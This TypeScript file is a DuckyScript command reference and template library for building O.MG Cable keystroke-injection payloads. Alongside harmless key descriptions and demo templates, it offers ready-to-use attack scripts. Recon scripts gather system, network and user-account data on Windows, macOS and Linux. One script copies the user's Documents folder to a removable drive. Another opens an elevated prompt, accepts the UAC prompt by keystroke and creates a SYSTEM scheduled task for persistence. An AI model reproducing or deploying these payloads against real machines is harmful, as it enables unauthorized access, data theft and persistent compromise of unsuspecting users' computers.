/**
 * DuckyScript Command Library
 * A comprehensive collection of DuckyScript commands, templates, and examples
 * for O.MG Cable payload development
 */

export interface DuckyCommand {
  name: string;
  syntax: string;
  description: string;
  example: string;
  category: 'basic' | 'keyboard' | 'system' | 'advanced';
}

export interface DuckyTemplate {
  name: string;
  description: string;
  category: 'reconnaissance' | 'exfiltration' | 'persistence' | 'demonstration';
  code: string;
  targetOS: 'windows' | 'macos' | 'linux' | 'universal';
}

/**
 * Basic DuckyScript commands reference
 */
export const duckyCommands: DuckyCommand[] = [
  // Basic commands
  {
    name: 'REM',
    syntax: 'REM [comment]',
    description: 'Adds a comment to the script that is not executed.',
    example: 'REM This is a comment',
    category: 'basic'
  },
  {
    name: 'STRING',
    syntax: 'STRING [text]',
    description: 'Types the specified text.',
    example: 'STRING Hello, world!',
    category: 'basic'
  },
  {
    name: 'DELAY',
    syntax: 'DELAY [milliseconds]',
    description: 'Pauses execution for the specified number of milliseconds.',
    example: 'DELAY 1000',
    category: 'basic'
  },
  {
    name: 'DEFAULTDELAY',
    syntax: 'DEFAULTDELAY [milliseconds]',
    description: 'Sets a default delay between each command.',
    example: 'DEFAULTDELAY 100',
    category: 'basic'
  },
  
  // Keyboard commands
  {
    name: 'GUI',
    syntax: 'GUI [key]',
    description: 'Presses the Windows or Command key in combination with another key.',
    example: 'GUI r',
    category: 'keyboard'
  },
  {
    name: 'SHIFT',
    syntax: 'SHIFT [key]',
    description: 'Holds SHIFT and presses another key.',
    example: 'SHIFT hello',
    category: 'keyboard'
  },
  {
    name: 'ALT',
    syntax: 'ALT [key]',
    description: 'Holds ALT and presses another key.',
    example: 'ALT F4',
    category: 'keyboard'
  },
  {
    name: 'CONTROL',
    syntax: 'CONTROL [key]',
    description: 'Holds CTRL and presses another key.',
    example: 'CONTROL c',
    category: 'keyboard'
  },
  {
    name: 'ENTER',
    syntax: 'ENTER',
    description: 'Presses the ENTER key.',
    example: 'ENTER',
    category: 'keyboard'
  },
  {
    name: 'ESCAPE',
    syntax: 'ESCAPE',
    description: 'Presses the ESC key.',
    example: 'ESCAPE',
    category: 'keyboard'
  },
  {
    name: 'TAB',
    syntax: 'TAB',
    description: 'Presses the TAB key.',
    example: 'TAB',
    category: 'keyboard'
  },
  {
    name: 'SPACE',
    syntax: 'SPACE',
    description: 'Presses the SPACE key.',
    example: 'SPACE',
    category: 'keyboard'
  },
  {
    name: 'CAPSLOCK',
    syntax: 'CAPSLOCK',
    description: 'Toggles CAPS LOCK.',
    example: 'CAPSLOCK',
    category: 'keyboard'
  },
  {
    name: 'DELETE',
    syntax: 'DELETE',
    description: 'Presses the DELETE key.',
    example: 'DELETE',
    category: 'keyboard'
  },
  {
    name: 'BACKSPACE',
    syntax: 'BACKSPACE',
    description: 'Presses the BACKSPACE key.',
    example: 'BACKSPACE',
    category: 'keyboard'
  },
  {
    name: 'END',
    syntax: 'END',
    description: 'Presses the END key.',
    example: 'END',
    category: 'keyboard'
  },
  {
    name: 'HOME',
    syntax: 'HOME',
    description: 'Presses the HOME key.',
    example: 'HOME',
    category: 'keyboard'
  },
  {
    name: 'INSERT',
    syntax: 'INSERT',
    description: 'Presses the INSERT key.',
    example: 'INSERT',
    category: 'keyboard'
  },
  {
    name: 'PAGEUP',
    syntax: 'PAGEUP',
    description: 'Presses the PAGE UP key.',
    example: 'PAGEUP',
    category: 'keyboard'
  },
  {
    name: 'PAGEDOWN',
    syntax: 'PAGEDOWN',
    description: 'Presses the PAGE DOWN key.',
    example: 'PAGEDOWN',
    category: 'keyboard'
  },
  {
    name: 'UP',
    syntax: 'UP',
    description: 'Presses the UP ARROW key.',
    example: 'UP',
    category: 'keyboard'
  },
  {
    name: 'DOWN',
    syntax: 'DOWN',
    description: 'Presses the DOWN ARROW key.',
    example: 'DOWN',
    category: 'keyboard'
  },
  {
    name: 'LEFT',
    syntax: 'LEFT',
    description: 'Presses the LEFT ARROW key.',
    example: 'LEFT',
    category: 'keyboard'
  },
  {
    name: 'RIGHT',
    syntax: 'RIGHT',
    description: 'Presses the RIGHT ARROW key.',
    example: 'RIGHT',
    category: 'keyboard'
  },
  
  // System commands
  {
    name: 'PRINTSCREEN',
    syntax: 'PRINTSCREEN',
    description: 'Presses the PRINT SCREEN key.',
    example: 'PRINTSCREEN',
    category: 'system'
  },
  {
    name: 'SCROLLLOCK',
    syntax: 'SCROLLLOCK',
    description: 'Toggles SCROLL LOCK.',
    example: 'SCROLLLOCK',
    category: 'system'
  },
  {
    name: 'NUMLOCK',
    syntax: 'NUMLOCK',
    description: 'Toggles NUM LOCK.',
    example: 'NUMLOCK',
    category: 'system'
  },
  {
    name: 'MENU',
    syntax: 'MENU',
    description: 'Presses the context menu key.',
    example: 'MENU',
    category: 'system'
  },
  
  // Advanced commands
  {
    name: 'REPEAT',
    syntax: 'REPEAT [count]',
    description: 'Repeats the previous command the specified number of times.',
    example: 'REPEAT 10',
    category: 'advanced'
  },
  {
    name: 'STRINGLN',
    syntax: 'STRINGLN [text]',
    description: 'Types the specified text and presses ENTER.',
    example: 'STRINGLN echo Hello, world!',
    category: 'advanced'
  }
];

/**
 * Predefined DuckyScript templates for various purposes
 */
export const duckyTemplates: DuckyTemplate[] = [
  // Reconnaissance templates
  {
    name: 'System Information (Windows)',
    description: 'Gathers basic system information and saves it to a file',
    category: 'reconnaissance',
    targetOS: 'windows',
    code: `REM System Information Gathering Script
REM Opens command prompt and collects system information
DELAY 1000
GUI r
DELAY 500
STRING cmd
DELAY 500
ENTER
DELAY 1000
STRINGLN systeminfo > %TEMP%\\sysinfo.txt
DELAY 2000
STRINGLN ipconfig /all >> %TEMP%\\sysinfo.txt
DELAY 1000
STRINGLN net user >> %TEMP%\\sysinfo.txt
DELAY 1000
STRINGLN echo System information collected!
DELAY 500
REM You can add exfiltration steps here if needed`
  },
  {
    name: 'System Information (macOS)',
    description: 'Gathers basic system information on macOS',
    category: 'reconnaissance',
    targetOS: 'macos',
    code: `REM System Information Gathering Script for macOS
DELAY 1000
GUI SPACE
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 1000
STRINGLN system_profiler SPHardwareDataType > ~/sysinfo.txt
DELAY 1000
STRINGLN ifconfig >> ~/sysinfo.txt
DELAY 1000
STRINGLN whoami >> ~/sysinfo.txt
DELAY 500
STRINGLN echo System information collected!`
  },
  {
    name: 'System Information (Linux)',
    description: 'Gathers basic system information on Linux',
    category: 'reconnaissance',
    targetOS: 'linux',
    code: `REM System Information Gathering Script for Linux
DELAY 1000
ALT F2
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 1000
STRINGLN uname -a > ~/sysinfo.txt
DELAY 500
STRINGLN cat /etc/os-release >> ~/sysinfo.txt
DELAY 500
STRINGLN ifconfig >> ~/sysinfo.txt
DELAY 1000
STRINGLN echo System information collected!`
  },
  
  // Exfiltration templates
  {
    name: 'File Exfiltration (Windows)',
    description: 'Copies files to a USB drive (simulated)',
    category: 'exfiltration',
    targetOS: 'windows',
    code: `REM File Exfiltration Script
REM This script copies documents to a removable drive
DELAY 1000
GUI r
DELAY 500
STRING cmd
DELAY 500
ENTER
DELAY 1000
STRINGLN cd %USERPROFILE%\\Documents
DELAY 500
STRINGLN dir /b > filelist.txt
DELAY 1000
STRINGLN for /f %f in (filelist.txt) do copy "%f" E:\\backup\\
DELAY 2000
STRINGLN echo Files copied to external drive!
DELAY 500
STRINGLN del filelist.txt`
  },
  
  // Persistence templates
  {
    name: 'Schedule Task (Windows)',
    description: 'Creates a scheduled task for persistence',
    category: 'persistence',
    targetOS: 'windows',
    code: `REM Schedule Task for Persistence
REM Creates a scheduled task that runs at login
DELAY 1000
GUI r
DELAY 500
STRING cmd
DELAY 500
CONTROL SHIFT ENTER
DELAY 1500
ALT y
DELAY 1000
STRINGLN schtasks /create /tn "SystemCheck" /tr "C:\\Windows\\System32\\cmd.exe /c echo Task running > C:\\temp\\log.txt" /sc onlogon /ru System
DELAY 1000
STRINGLN echo Scheduled task created!`
  },
  
  // Demonstration templates
  {
    name: 'Notepad Prank',
    description: 'Opens Notepad and types a message',
    category: 'demonstration',
    targetOS: 'universal',
    code: `REM Notepad Prank
REM Opens notepad and types a message
DELAY 1000
GUI r
DELAY 500
STRING notepad
DELAY 500
ENTER
DELAY 1000
STRING This device has been compromised by a rubber ducky attack!
DELAY 500
ENTER
ENTER
STRING Don't worry, this is just a demonstration.
DELAY 500
ENTER
ENTER
STRING Always be careful about what you plug into your computer.`
  },
  {
    name: 'Lock Workstation',
    description: 'Quickly locks the workstation',
    category: 'demonstration',
    targetOS: 'universal',
    code: `REM Lock Workstation
REM This script quickly locks the computer
DELAY 1000
GUI l`
  },
  {
    name: 'Website Redirect',
    description: 'Opens a browser and navigates to a specified website',
    category: 'demonstration',
    targetOS: 'universal',
    code: `REM Website Redirect
REM Opens default browser and goes to a website
DELAY 1000
GUI r
DELAY 500
STRING https://example.com
DELAY 500
ENTER`
  }
];

/**
 * Get templates compatible with a specific operating system
 * @param os Operating system to filter by (windows, macos, linux, or universal)
 * @returns Array of compatible templates
 */
export function getTemplatesForOS(os: 'windows' | 'macos' | 'linux'): DuckyTemplate[] {
  return duckyTemplates.filter(template => 
    template.targetOS === os || template.targetOS === 'universal'
  );
}

/**
 * Get commands by category
 * @param category Category to filter by
 * @returns Array of commands in the specified category
 */
export function getCommandsByCategory(category: 'basic' | 'keyboard' | 'system' | 'advanced'): DuckyCommand[] {
  return duckyCommands.filter(command => command.category === category);
}

/**
 * Get all available command categories
 * @returns Array of unique categories
 */
export function getCommandCategories(): string[] {
  return [...new Set(duckyCommands.map(cmd => cmd.category))];
}

/**
 * Get all available template categories
 * @returns Array of unique template categories
 */
export function getTemplateCategories(): string[] {
  return [...new Set(duckyTemplates.map(tpl => tpl.category))];
}

/**
 * Search for commands by keyword
 * @param keyword Search term
 * @returns Array of matching commands
 */
export function searchCommands(keyword: string): DuckyCommand[] {
  const searchTerm = keyword.toLowerCase();
  return duckyCommands.filter(cmd => 
    cmd.name.toLowerCase().includes(searchTerm) || 
    cmd.description.toLowerCase().includes(searchTerm) ||
    cmd.example.toLowerCase().includes(searchTerm)
  );
}

/**
 * Search for templates by keyword
 * @param keyword Search term
 * @returns Array of matching templates
 */
export function searchTemplates(keyword: string): DuckyTemplate[] {
  const searchTerm = keyword.toLowerCase();
  return duckyTemplates.filter(tpl => 
    tpl.name.toLowerCase().includes(searchTerm) || 
    tpl.description.toLowerCase().includes(searchTerm) ||
    tpl.code.toLowerCase().includes(searchTerm)
  );
} 